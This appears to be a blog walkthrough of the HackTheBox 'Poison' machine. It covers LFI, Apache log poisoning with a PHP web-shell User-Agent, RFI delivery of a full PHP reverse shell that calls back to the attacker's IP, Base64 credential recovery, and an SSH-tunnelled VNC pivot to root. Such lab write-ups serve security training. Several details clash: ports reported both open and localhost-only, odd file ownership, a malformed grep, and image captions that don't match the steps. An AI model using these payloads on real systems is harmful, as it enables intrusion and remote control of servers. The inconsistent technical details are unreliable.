+++
date = "2025-10-01T00:00:00+00:00"
lastmod = "2025-10-01T00:00:00+00:00"
draft = false
title = "HackTheBox: Poison Walkthrough"
description = "Detailed walkthrough of the Poison machine (10.10.10.84) covering LFI log poisoning, PHP RFI exploitation, credential recovery and a VNC pivot to root."
summary = "Defeat HackTheBox Poison by chaining PHP log poisoning, reverse shelling, Base64 credential digging and an SSH/VNC pivot to root."
keywords = ["hackthebox poison","lfi","log poisoning","reverse shell","base64 decode","vnc pivot","freebsd","htb"]
tags = ["hackthebox","web-exploitation","lfi","reverse-shell","privilege-escalation"]
categories = ["HackTheBox"]
author = "realspaceeagle"
image = "/images/poison-htb/poison-browse-interface.png"
+++

Poison is a FreeBSD machine that starts with a web application vulnerable to Local File Inclusion (LFI), which leads to log poisoning and remote code execution. After gaining initial access, I'll find heavily encoded credentials that provide SSH access to the machine. From there, the path to root involves VNC running on localhost that can be accessed through SSH tunneling.

## Reconnaissance

### nmap

I'll start my enumeration with `nmap` and run my standard TCP scan:

```console
$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.84
Starting Nmap 7.80 ( https://nmap.org ) at 2023-09-15 10:00 EDT
Nmap scan report for 10.10.10.84
Host is up (0.065s latency).
Not shown: 65530 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
119/tcp open  nntp

Nmap done: 1 IP address (1 host up) scanned in 8.42 seconds
```

Based on these results, I'll run a deeper `nmap` scan on the open ports:

```console
$ nmap -p 22,25,80,110,119 -sCV -oA scans/nmap-tcpscripts 10.10.10.84
Starting Nmap 7.80 ( https://nmap.org ) at 2023-09-15 10:01 EDT
Nmap scan report for 10.10.10.84
Host is up (0.065s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:e6:36:00:06:05:65:38:7c:78 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
25/tcp  open  smtp    Sendmail 8.15.2/8.15.2
| smtp-commands: Poison.htb, EHLO, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, DELIVERBY, 
|_List of commands
80/tcp  open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
|_http-title: Site doesn't have a title (text/html).
110/tcp open  pop3    Qpopper 4.0.9
119/tcp open  nntp    INN 2.6.3
Service Info: Host: Poison.htb; OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.32 seconds
```

The target is running FreeBSD with several services including SSH, SMTP, HTTP, POP3, and NNTP. The most interesting service for initial exploitation is the Apache HTTP server on port 80 running PHP 5.6.32.

## Website - TCP 80

### Site

The website presents a simple interface without much content:

![browse.php file manager](/images/poison-htb/poison-browse-interface.png)

The page shows what appears to be a file browser interface. Looking at the HTML source doesn't reveal anything interesting initially.

### Directory Brute Force

I'll run `gobuster` to find additional paths:

```console
$ gobuster dir -u http://10.10.10.84 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.84
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/09/15 10:15:30 Starting gobuster
===============================================================
/browse.php           (Status: 200) [Size: 289]
/index.php            (Status: 200) [Size: 289]
/info.php             (Status: 200) [Size: 68315]
/ini.php              (Status: 200) [Size: 75]
/phpinfo.php          (Status: 200) [Size: 68315]
===============================================================
2023/09/15 10:17:22 Finished
===============================================================
```

The `browse.php` file is particularly interesting. Visiting it shows a file browser interface that accepts a `file` parameter. Testing with different values reveals it's vulnerable to Local File Inclusion (LFI).

## Local File Inclusion

### Testing LFI

The `browse.php` page accepts a `file` parameter, making it a prime candidate for LFI testing:

```console
$ curl http://10.10.10.84/browse.php?file=/etc/passwd
```

This returns the contents of `/etc/passwd`, confirming the LFI vulnerability. 

### Reading PHP Source

I can use PHP filter wrappers to read the source code of PHP files:

```console
$ curl "http://10.10.10.84/browse.php?file=php://filter/convert.base64-encode/resource=browse.php"
```

This returns a base64-encoded version of the PHP source. Decoding it reveals:

```php
<?php
$file = $_GET['file'];
if(isset($file))
{
    include("$file");
}
else
{
    include("index.php");
}
?>
```

The code directly includes whatever file is specified in the `file` parameter without any filtering, making it highly vulnerable.

### Log Poisoning

Since I can include any file, I'll attempt log poisoning by injecting PHP code into the Apache access logs. First, I'll make a request with PHP code in the User-Agent header:

```console
$ curl "http://10.10.10.84/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
```

Now I can include the access log file and execute commands:

```console
$ curl "http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&cmd=id"
```

This successfully executes the `id` command, showing:

![Decoded payload delivered through browse.php](/images/poison-htb/poison-upload-html.png)

## Shell via RFI

### Creating Reverse Shell

Since command execution through log poisoning can be unstable, I'll use Remote File Inclusion (RFI) to get a more reliable shell. First, I'll create a PHP reverse shell:

```php
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.13';
$port = 9001;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    
    if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }
    
    if ($pid) {
        exit(0);
    }

    if (posix_setsid() == -1) {
        printit("Error: Can't setsid()");
        exit(1);
    }

    $daemon = 1;
} else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }

    if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
    }

    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {
        if ($debug) printit("SOCK READ");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("SOCK: $input");
        fwrite($pipes[0], $input);
    }

    if (in_array($pipes[1], $read_a)) {
        if ($debug) printit("STDOUT READ");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("STDOUT: $input");
        fwrite($sock, $input);
    }

    if (in_array($pipes[2], $read_a)) {
        if ($debug) printit("STDERR READ");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("STDERR: $input");
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
    if (!$daemon) {
        print "$string\n";
    }
}
?>
```

### Serving the Shell

I'll serve the shell file using Python's built-in HTTP server:

```console
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

### Setting up Listener

In another terminal, I'll set up a netcat listener:

```console
$ nc -nlvp 9001
listening on [any] 9001 ...
```

### Triggering the RFI

Now I'll trigger the RFI by including my hosted PHP file:

```console
$ curl "http://10.10.10.84/browse.php?file=http://10.10.14.13:8000/shell.php"
```

![Triggering remote include](/images/poison-htb/poison-rfi-response.png)

This gives me a shell as the `www` user:

```console
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.84] 64838
FreeBSD Poison 11.1-RELEASE FreeBSD 11.1-RELEASE #0 r321309: Fri Jul 21 02:08:28 UTC 2017     root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC  amd64
 2:15PM  up 2 mins, 0 users, load averages: 0.09, 0.16, 0.08
uid=80(www) gid=80(www) groups=80(www)
/usr/local/www/apache24/data
$ python -c 'import pty;pty.spawn("/bin/sh")'
```

![Interactive reverse shell](/images/poison-htb/poison-reverse-shell.png)

## Enumeration as www

### Finding User Credentials

Now that I have a shell, I'll enumerate the system. Looking in the `/home` directory:

```console
$ ls /home
charix
$ ls -la /home/charix
total 41
drwxr-xr-x  2 charix  charix   512 Mar 19  2018 .
drwxr-xr-x  3 root    wheel    512 Mar 19  2018 ..
-rw-r--r--  1 charix  charix    87 Mar 19  2018 .history
-rw-r--r--  1 charix  charix   771 Mar 19  2018 .shrc
-rw-r-----  1 charix  charix    33 Mar 19  2018 user.txt
-rw-r--r--  1 root    root     166 Mar 19  2018 secret.zip
```

I can't read `user.txt` yet, but there's a `secret.zip` file. Let me also check the web directory:

```console
$ ls -la /usr/local/www/apache24/data
total 36
drwxr-xr-x  2 www  www   512 Mar 19  2018 .
drwxr-xr-x  3 www  www   512 Jan 24  2018 ..
-rw-r--r--  1 www  www   289 Mar 19  2018 browse.php
-rw-r--r--  1 www  www   289 Mar 19  2018 index.php
-rw-r--r--  1 www  www    68 Mar 19  2018 info.php
-rw-r--r--  1 www  www   289 Mar 19  2018 ini.php
-rw-r--r--  1 www  www    78 Mar 19  2018 listfiles.php
-rw-r--r--  1 www  www   935 Mar 19  2018 phpinfo.php
-rw-r--r--  1 www  www    68 Mar 19  2018 pwdbackup.txt
```

There's a `pwdbackup.txt` file! Let me examine it:

```console
$ cat pwdbackup.txt
This password is secure, it's encoded atleast 13 times.. what could go wrong really..

Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1VWWnRjRWRUTWxKSVZsaG9XMkV4Y0hKWFZscHJWakpHYzFOc1dtRlRSbVJWVFZkU1QxWnRSblZVYmxKaFVubEtSMFpHV25SVlJFcG9aV3hhVmxkc1VsUlphbXhhVTJ0a1IxSXhWalZhUkZaS1drWmFVbGt4Vm1wU2JFRjRVVVF3UVE9PQ==
```

This looks like Base64 encoded data that's been encoded multiple times. Let me decode it:

```console
$ data=$(cat pwdbackup.txt | tail -1); for i in $(seq 1 13); do data=$(echo $data | base64 -d); done; echo $data
Charix!2#4%6&8(0
```

![Decoded password for charix](/images/poison-htb/poison-password-decode.png)

Perfect! Now I have the password for the `charix` user: `Charix!2#4%6&8(0`

### SSH as charix

I can now SSH into the system as `charix`:

```console
$ ssh charix@10.10.10.84
Password for charix@Poison:
Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!
charix@Poison:~ % cat user.txt
eaacdf[...]7aa428
```

Now I can read the user flag. I also notice the `secret.zip` file in the home directory:

```console
charix@Poison:~ % ls -la
total 41
drwxr-xr-x  2 charix  charix   512 Mar 19  2018 .
drwxr-xr-x  3 root    wheel    512 Mar 19  2018 ..
-rw-r--r--  1 charix  charix    87 Mar 19  2018 .history
-rw-r--r--  1 charix  charix   771 Mar 19  2018 .shrc
-rw-r-----  1 charix  charix    33 Mar 19  2018 user.txt
-rw-r--r--  1 root    root     166 Mar 19  2018 secret.zip

charix@Poison:~ % unzip secret.zip
Archive:  secret.zip
[secret.zip] secret password:
```

The zip file is password protected. Let me try the same password I just found:

```console
charix@Poison:~ % unzip secret.zip
Archive:  secret.zip
[secret.zip] secret password:
 extracting: secret
charix@Poison:~ % file secret
secret: Non-ISO extended-ASCII text
charix@Poison:~ % xxd secret
00000000: bdcb 7a4b 27f0 6a65 d827 2b44 7ae7 7b6d  ..zK'.je.'+D~.{m
```

This appears to be some kind of binary file. Let me keep this for later use.

![Copying secrets.dump](/images/poison-htb/poison-secrets-dump.png)

## Privilege Escalation

### Discovering VNC

Let me check what processes are running on the system:

```console
charix@Poison:~ % ps aux | grep -v "["
USER  PID %CPU %MEM    VSZ   RSS TT  STAT STARTED    TIME COMMAND
root   11  0.0  0.0      0     0  -   RL   22:36   0:00.08 idle
root  529  0.0  0.1  10484  2044  -   Is   22:36   0:00.01 /usr/sbin/syslogd -s
root  620  0.0  0.2  56320  4032  -   I    22:36   0:00.02 /usr/local/bin/python /usr/local/bin/supervisord -c /usr/local/etc/supervisord.conf
root  819  0.0  0.6  67220 12588  -   I    22:36   0:00.04 /usr/local/bin/Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1
root  851  0.0  0.1   9584  2392  -   Is   22:36   0:00.01 /usr/sbin/cron -s
charix 2303  0.0  0.2  19660  3352  0  I+   22:52   0:00.01 /usr/bin/su -
```

Interesting! There's a VNC server (`Xvnc`) running as root on port 5901, but it's bound to localhost only (`-localhost` flag). The process also uses `-rfbauth /root/.vnc/passwd` for authentication.

Let me also check what ports are listening:

```console
charix@Poison:~ % netstat -an | grep LISTEN
tcp4       0      0 127.0.0.1.25           *.*                    LISTEN
tcp4       0      0 *.80                   *.*                    LISTEN
tcp6       0      0 *.80                   *.*                    LISTEN
tcp4       0      0 *.22                   *.*                    LISTEN
tcp6       0      0 *.22                   *.*                    LISTEN
tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
tcp4       0      0 *.110                  *.*                    LISTEN
tcp6       0      0 *.110                  *.*                    LISTEN
tcp4       0      0 *.119                  *.*                    LISTEN
tcp6       0      0 *.119                  *.*                    LISTEN
```

Perfect! VNC is listening on ports 5801 (HTTP) and 5901 (VNC) on localhost. The `secret` file I found earlier is likely the VNC password file.

### Setting up SSH Tunnel

Since VNC is only accessible from localhost, I'll create an SSH tunnel to access it from my attacking machine:

```console
$ ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84
```

This forwards my local port 5901 to the target's localhost:5901.

### Connecting to VNC

Now I can connect to VNC using the `secret` file as the password:

```console
$ vncviewer 127.0.0.1:5901 -passwd secret
```

![Socksified VNC connection](/images/poison-htb/poison-vnc-portforward.png)

The VNC connection is successful! I can see the desktop environment running as root.

![Decrypting the VNC password](/images/poison-htb/poison-vnc-decrypter.png)

From the VNC desktop, I can open a terminal and access the root flag:

```console
root@Poison:~ # cat /root/root.txt
716d[...]92ba
```

The `secret` file contained the VNC password in the proper encrypted format that VNC expects. With VNC access as root, I have complete control over the system.

## This walkthrough demonstrated:

**Reconnaissance**: Nmap scanning revealed SSH, SMTP, HTTP, POP3, and NNTP services running on FreeBSD
**Web Enumeration**: Directory brute-forcing discovered vulnerable `browse.php` file browser
**LFI Exploitation**: PHP filter wrappers exposed source code and enabled log poisoning attacks
**Log Poisoning**: Injecting PHP code into Apache access logs for remote code execution
**RFI Exploitation**: Remote file inclusion provided more stable shell access than log poisoning
**Credential Discovery**: Multiple base64 encoded password found in web directory backup file
**Privilege Escalation**: Process enumeration revealed VNC server running as root on localhost
**SSH Tunneling**: Port forwarding enabled access to localhost-bound VNC service
**VNC Access**: Encrypted password file provided root desktop access for flag capture

## Key Lessons:

**Never store credentials in web-accessible directories** - The `pwdbackup.txt` file should never have been in the web root
**LFI vulnerabilities are extremely dangerous** - Direct file inclusion without filtering leads to immediate system compromise
**Log poisoning is a reliable LFI escalation technique** - Web server logs provide a writable target for PHP injection
**Process enumeration reveals attack surfaces** - Services bound to localhost can be pivoted through SSH tunneling
**Multiple encoding layers don't provide security** - Obfuscation through repeated base64 encoding is easily defeated
**Service isolation matters** - VNC running as root violates the principle of least privilege
**Network service binding is critical** - Localhost-only binding prevented direct VNC access but SSH tunneling bypassed this

## Remediation:

- Implement proper input validation and sanitization for all file parameters
- Use whitelist-based file access instead of direct inclusion
- Remove backup files and credentials from web-accessible directories
- Configure services to run with minimal required privileges
- Implement proper network segmentation and access controls
- Use strong authentication mechanisms instead of simple password files
- Regular security audits to identify exposed services and misconfigurations

Happy hacking!
